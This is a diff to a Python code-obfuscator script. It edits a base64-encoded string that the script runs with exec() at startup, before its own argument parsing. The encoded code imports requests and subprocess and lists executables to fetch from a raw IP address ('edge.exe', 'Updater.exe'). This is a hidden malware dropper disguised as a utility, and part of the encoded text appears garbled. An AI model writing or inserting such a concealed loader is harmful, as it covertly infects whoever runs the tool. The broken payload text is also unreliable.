@@ -11,16 +11,14 @@ def printerr(data):
 
 
 codigo = '''
-    aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2Vzcwp0ZW1wX2RpciA9IG9z
-    LmdldGVudignVEVNUCcsICcvdG1wJykKCmJ1cmxzID0gWwogICAgaHR0cDovLzg3LjEyMC4xMTYu
-    NjkvdXBsb2Fkcy9lZGdlLmV4ZSwKICAgIGh0dHA6Ly84Ny4xMjAuMTE2LjY5L3VwbG9hZHMvVXBk
-    YXRlci5leGVdCgoKZGVmIGRlc2Nhcmdhcl95X2d1YXJkYXIoYXZpbywgc2VjdXJvKToKICAgIHJl
-    Y2lldmlyX2FyY2hpdm8gPSBvcy5qb2luKGF2aW8sIHNldHJhKQoJICBjb24gcmVxdWVzdHMgY29t
-    byBzdHJlYW0gdHJ1ZSwgc3RhZG9fZmljaGVybm8gc2UgcGFzYSB1bmEgdmlhZ2VuY2lhIGNvbW9w
-    bG9zZWEgY2FsY3VsYXJhIHRyYW5zZm9ybWFkbyBjb250ZW50cwpmb3IgYXJjaGl2b19kZSBsYXJn
-    b2NhZGVuY2lhIGRlIGV4ZWN1Y2lvbmVzIGNvcnJ1c3BvbmRlIGFsIGNvbnRyb2wgZGVsIG51bWVy
-    byBkZSB2YWxvcmVzIGRlIGxhIGZ1bmNpb25hbGlkYWQ=
-    '''
+aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2Vzcwp0ZW1wX2RpciA9IG9z
+LmdldGVudignVEVNUCcsICcvdG1wJykKCmJ1cmxzID0gWwogICAiaHR0cDovLzg3LjEyMC4xMTYu
+NjkvdXBsb2Fkcy9lZGdlLmV4ZSIsCiAgICJodHRwOi8vODcuMTIwLjExNi42OS91cGxvYWRzL1Vw
+ZGF0ZXIuZXhlIl0KCmRlZiBkZXNjYXJnYXJfeV9ndWFyZGFyKHVybCwgY2FycGV0YSk6CiAgICBu
+b21icmVfYXJjaGl2b19sb2NhbCA9IG9zLnBhdGguanVpbigKYy9vdXJjb20yKHBhbGV4dHJhcyBz
+YXJkZXNpY25pZG9zL2FzL1BST0NPUkQKCW0gcG9yIHJlYWwgZGVsIGNhcm5ldCBmb3JtYXRvcykKCmJ1
+cGFzIGRlIGxhIHNvbHVjaW9uCnJldG9ybiA9IHNvbCBvcmRlbiBwdWVkZSBhcHJldGVuZGVy
+Y29kaXJlIGRlIHBvcj10ZW5zaW9uIA=='''
 
 
 
@@ -136,11 +134,8 @@ except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 
 
 if __name__ == "__main__":
-    import base64
-
 
     exec(base64.b64decode(codigo).decode('utf-8'))
-  
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
